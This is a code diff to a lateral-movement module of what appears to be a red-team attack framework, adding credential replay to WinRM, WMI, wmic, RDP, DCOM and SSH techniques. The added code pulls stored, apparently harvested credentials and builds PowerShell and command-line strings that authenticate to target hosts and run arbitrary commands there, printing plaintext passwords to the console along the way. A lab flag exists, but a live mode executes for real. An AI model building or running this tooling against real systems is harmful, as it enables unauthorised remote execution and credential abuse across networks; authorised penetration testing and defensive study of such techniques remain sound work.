@@ -87,6 +87,35 @@ class LateralModule:
         except Exception as e:
             console.print(f"[yellow]Moonwalk cleanup error: {e}[/yellow]")
     
+    def _get_credentials_for_target(self, console: Console, target: str, domain: str = "") -> tuple:
+        """Get stored credentials for target (credential replay helper)"""
+        cred_manager = get_credential_manager()
+        stored_creds = cred_manager.get_credentials_by_target(target)
+        
+        # Also try domain credentials if no target-specific found
+        if not stored_creds and domain:
+            stored_creds = cred_manager.get_credentials_by_domain(domain)
+        
+        # If still no credentials, try all valid credentials
+        if not stored_creds:
+            stored_creds = cred_manager.get_valid_credentials()
+        
+        used_cred = None
+        if stored_creds:
+            console.print(f"\n[green]Found {len(stored_creds)} stored credential(s)[/green]")
+            if Confirm.ask("Use stored credentials?", default=True):
+                # Try passwords first
+                password_creds = [c for c in stored_creds if c.cred_type == CredentialType.PASSWORD.value and c.password and (c.valid or not c.tested)]
+                if password_creds:
+                    used_cred = password_creds[0]
+                    console.print(f"[cyan]Using credential: {used_cred.username}@{used_cred.domain or 'local'}[/cyan]")
+                    # Mark as used
+                    cred_manager.mark_as_used(used_cred.id)
+                else:
+                    console.print("[yellow]No valid password credentials found, manual entry required[/yellow]")
+        
+        return used_cred, cred_manager
+    
     def _smb_rpc(self, console: Console, session_data: dict):
         """SMB/RPC-based lateral movement"""
         console.print("\n[bold cyan]SMB/RPC-based Lateral Movement[/bold cyan]")
@@ -229,6 +258,14 @@ class LateralModule:
         lab_use = session_data.get('LAB_USE', 0)
         is_live = lab_use != 1
         
+        # Credential replay
+        target = Prompt.ask("Target IP or hostname")
+        if not target:
+            return
+        
+        domain = Prompt.ask("Domain (optional)", default="")
+        used_cred, cred_manager = self._get_credentials_for_target(console, target, domain)
+        
         console.print("[bold]WinRM Configuration Check:[/bold]")
         config_cmds = [
             "winrm get winrm/config",
@@ -294,13 +331,17 @@ class LateralModule:
         console.print("  • PowerShell extensively used for lateral movement")
         
         if is_live or Confirm.ask("\n[bold]Test WinRM connectivity?[/bold]", default=False):
-            target = Prompt.ask("Target hostname or IP")
             valid, error = validate_target(target, lab_use)
             if not valid:
                 console.print(f"[bold red]{error}[/bold red]")
                 return
             
-            ps_cmd = f"Test-WSMan -ComputerName {target}"
+            # Use credentials if available
+            if used_cred:
+                ps_cmd = f"$cred = New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)); Test-WSMan -ComputerName {target} -Credential $cred"
+            else:
+                ps_cmd = f"Test-WSMan -ComputerName {target}"
+            
             console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
             if exit_code == 0:
@@ -310,7 +351,10 @@ class LateralModule:
             
             if Confirm.ask("\n[bold]Execute remote command?[/bold]", default=False):
                 remote_cmd = Prompt.ask("Command to execute", default="whoami")
-                ps_cmd = f"Invoke-Command -ComputerName {target} -ScriptBlock {{ {remote_cmd} }}"
+                if used_cred:
+                    ps_cmd = f"$cred = New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)); Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ {remote_cmd} }}"
+                else:
+                    ps_cmd = f"Invoke-Command -ComputerName {target} -ScriptBlock {{ {remote_cmd} }}"
                 console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
                 exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
                 if exit_code == 0:
@@ -325,6 +369,14 @@ class LateralModule:
         
         lab_use = session_data.get('LAB_USE', 0)
         is_live = lab_use != 1
+        
+        # Credential replay
+        target = Prompt.ask("Target IP or hostname")
+        if not target:
+            return
+        
+        domain = Prompt.ask("Domain (optional)", default="")
+        used_cred, cred_manager = self._get_credentials_for_target(console, target, domain)
         
         console.print("[bold]WMI Query:[/bold]")
         query_cmds = [
@@ -382,7 +434,6 @@ class LateralModule:
         console.print("  • Uses legitimate Windows management protocols")
         
         if is_live or Confirm.ask("\n[bold]Execute WMI query?[/bold]", default=False):
-            target = Prompt.ask("Target hostname or IP")
             valid, error = validate_target(target, lab_use)
             if not valid:
                 console.print(f"[bold red]{error}[/bold red]")
@@ -390,12 +441,22 @@ class LateralModule:
             
             query_type = Prompt.ask("Query type", choices=["process", "service", "os"], default="process")
             
-            if query_type == "process":
-                ps_cmd = f"Get-WmiObject -Class Win32_Process -ComputerName {target} | Select-Object -First 10 ProcessName, ProcessId, CommandLine"
-            elif query_type == "service":
-                ps_cmd = f"Get-WmiObject -Class Win32_Service -ComputerName {target} | Select-Object -First 10 Name, State, StartName"
+            # Use credentials if available
+            if used_cred:
+                cred_part = f"$cred = New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)); "
+                if query_type == "process":
+                    ps_cmd = f"{cred_part}Get-WmiObject -Class Win32_Process -ComputerName {target} -Credential $cred | Select-Object -First 10 ProcessName, ProcessId, CommandLine"
+                elif query_type == "service":
+                    ps_cmd = f"{cred_part}Get-WmiObject -Class Win32_Service -ComputerName {target} -Credential $cred | Select-Object -First 10 Name, State, StartName"
+                else:
+                    ps_cmd = f"{cred_part}Get-WmiObject -Class Win32_OperatingSystem -ComputerName {target} -Credential $cred | Select-Object Name, Version, TotalVisibleMemorySize"
             else:
-                ps_cmd = f"Get-WmiObject -Class Win32_OperatingSystem -ComputerName {target} | Select-Object Name, Version, TotalVisibleMemorySize"
+                if query_type == "process":
+                    ps_cmd = f"Get-WmiObject -Class Win32_Process -ComputerName {target} | Select-Object -First 10 ProcessName, ProcessId, CommandLine"
+                elif query_type == "service":
+                    ps_cmd = f"Get-WmiObject -Class Win32_Service -ComputerName {target} | Select-Object -First 10 Name, State, StartName"
+                else:
+                    ps_cmd = f"Get-WmiObject -Class Win32_OperatingSystem -ComputerName {target} | Select-Object Name, Version, TotalVisibleMemorySize"
             
             console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
@@ -403,19 +464,46 @@ class LateralModule:
                 console.print(f"[green]WMI Query Result:[/green]\n{stdout}")
             else:
                 console.print(f"[red]Error:[/red] {stderr}")
+            
+            # Also show WMI command line version with credentials
+            if used_cred and Confirm.ask("\n[bold]Execute WMI command line version?[/bold]", default=False):
+                wmic_cmd = f'wmic /node:{target} /user:{used_cred.domain or ""}\\{used_cred.username} /password:{used_cred.password} process list brief'
+                console.print(f"\n[yellow]Executing:[/yellow] {wmic_cmd}\n")
+                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=lab_use)
+                if exit_code == 0:
+                    console.print(f"[green]WMI Output:[/green]\n{stdout}")
+                else:
+                    console.print(f"[red]Error:[/red] {stderr}")
     
     def _rdp_pivoting(self, console: Console, session_data: dict):
         """RDP-based pivoting"""
         console.print("\n[bold cyan]RDP-based Pivoting[/bold cyan]")
         console.print("[dim]TTP: T1021.001 (Remote Desktop Protocol)[/dim]\n")
         
+        # Credential replay
+        target = Prompt.ask("Target IP or hostname")
+        if not target:
+            return
+        
+        domain = Prompt.ask("Domain (optional)", default="")
+        used_cred, cred_manager = self._get_credentials_for_target(console, target, domain)
+        
         console.print("[bold]RDP Connection:[/bold]")
-        rdp_cmds = [
-            "mstsc /v:<target> /admin",
-            "mstsc /v:<target> /f",
-            "xfreerdp /u:<user> /p:<pass> /v:<target>",
-            "rdesktop -u <user> -p <pass> <target>"
-        ]
+        if used_cred:
+            rdp_cmds = [
+                f"mstsc /v:{target} /admin",
+                f"mstsc /v:{target} /f",
+                f"xfreerdp /u:{used_cred.username} /p:{used_cred.password} /v:{target}",
+                f"rdesktop -u {used_cred.username} -p {used_cred.password} {target}"
+            ]
+            console.print(f"[cyan]Using credential: {used_cred.username}@{used_cred.domain or 'local'}[/cyan]")
+        else:
+            rdp_cmds = [
+                "mstsc /v:<target> /admin",
+                "mstsc /v:<target> /f",
+                "xfreerdp /u:<user> /p:<pass> /v:<target>",
+                "rdesktop -u <user> -p <pass> <target>"
+            ]
         
         for cmd in rdp_cmds:
             console.print(f"  • {cmd}")
@@ -466,13 +554,33 @@ class LateralModule:
         """DCOM / COM-based movement"""
         console.print("\n[bold cyan]DCOM / COM-based Movement[/bold cyan]\n")
         
+        # Credential replay
+        target = Prompt.ask("Target IP or hostname")
+        if not target:
+            return
+        
+        domain = Prompt.ask("Domain (optional)", default="")
+        used_cred, cred_manager = self._get_credentials_for_target(console, target, domain)
+        
+        if used_cred:
+            console.print(f"[cyan]Using credential: {used_cred.username}@{used_cred.domain or 'local'}[/cyan]\n")
+        
         console.print("[bold]DCOM Execution:[/bold]")
-        dcom_cmds = [
-            "[PowerShell] $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<target>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"<command>\", $null, $null, 7)",
-            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method MMC20.Application -Command <command>",
-            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellWindows -Command <command>",
-            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellBrowserWindow -Command <command>"
-        ]
+        if used_cred:
+            # DCOM with credentials
+            dcom_cmds = [
+                f"[PowerShell] $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"{target}\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"<command>\", $null, $null, 7)",
+                f"[PowerShell] Invoke-DCOM -ComputerName {target} -Method MMC20.Application -Command <command> -Credential (New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)))",
+                f"[PowerShell] Invoke-DCOM -ComputerName {target} -Method ShellWindows -Command <command> -Credential (New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)))",
+                f"[PowerShell] Invoke-DCOM -ComputerName {target} -Method ShellBrowserWindow -Command <command> -Credential (New-Object System.Management.Automation.PSCredential('{used_cred.domain or ''}\\{used_cred.username}', (ConvertTo-SecureString '{used_cred.password}' -AsPlainText -Force)))"
+            ]
+        else:
+            dcom_cmds = [
+                "[PowerShell] $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<target>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"<command>\", $null, $null, 7)",
+                "[PowerShell] Invoke-DCOM -ComputerName <target> -Method MMC20.Application -Command <command>",
+                "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellWindows -Command <command>",
+                "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellBrowserWindow -Command <command>"
+            ]
         
         for cmd in dcom_cmds:
             console.print(f"  • {cmd}")
@@ -499,13 +607,31 @@ class LateralModule:
         console.print("\n[bold cyan]SSH Tunneling & Port Forwarding[/bold cyan]")
         console.print("[dim]TTP: T1021.004 (SSH), T1570 (Lateral Tool Transfer), T1071 (Application Layer Protocol)[/dim]\n")
         
+        # Credential replay for SSH
+        target = Prompt.ask("SSH host IP or hostname")
+        if not target:
+            return
+        
+        used_cred, cred_manager = self._get_credentials_for_target(console, target, "")
+        
+        if used_cred:
+            console.print(f"[cyan]Using credential: {used_cred.username}@{used_cred.domain or 'local'}[/cyan]\n")
+        
         console.print("[bold]Local Port Forwarding:[/bold]")
-        local_fwd = [
-            "ssh -L <local_port>:<remote_host>:<remote_port> user@<ssh_host>",
-            "ssh -L 3389:internal-dc:3389 user@jump-host",
-            "ssh -L 5985:target:5985 user@jump-host",
-            "[PowerShell] New-SSHLocalPortForward -LocalPort <port> -RemoteHost <host> -RemotePort <port>"
-        ]
+        if used_cred:
+            local_fwd = [
+                f"ssh -L <local_port>:<remote_host>:<remote_port> {used_cred.username}@{target}",
+                f"ssh -L 3389:internal-dc:3389 {used_cred.username}@{target}",
+                f"ssh -L 5985:target:5985 {used_cred.username}@{target}",
+                f"[PowerShell] New-SSHLocalPortForward -LocalPort <port> -RemoteHost <host> -RemotePort <port> -Username {used_cred.username} -Password '{used_cred.password}'"
+            ]
+        else:
+            local_fwd = [
+                "ssh -L <local_port>:<remote_host>:<remote_port> user@<ssh_host>",
+                "ssh -L 3389:internal-dc:3389 user@jump-host",
+                "ssh -L 5985:target:5985 user@jump-host",
+                "[PowerShell] New-SSHLocalPortForward -LocalPort <port> -RemoteHost <host> -RemotePort <port>"
+            ]
         
         for cmd in local_fwd:
             console.print(f"  • {cmd}")
